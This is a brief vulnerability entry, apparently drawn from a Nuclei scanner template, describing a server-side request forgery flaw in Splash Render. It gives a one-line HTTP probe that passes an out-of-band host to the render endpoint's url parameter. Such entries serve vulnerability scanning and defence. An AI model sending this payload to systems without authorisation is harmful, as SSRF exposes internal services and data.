# Vulnerability: Splash Render - SSRF
**Classification:** CWE-99,CWE-918
**Source:** Nuclei Template (`splash-render-ssrf.yaml`)

## Description
Splash Render is vulnerable to Server-Side Request Forgery (SSRF) Vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/render.html?url=https://oast.live
```

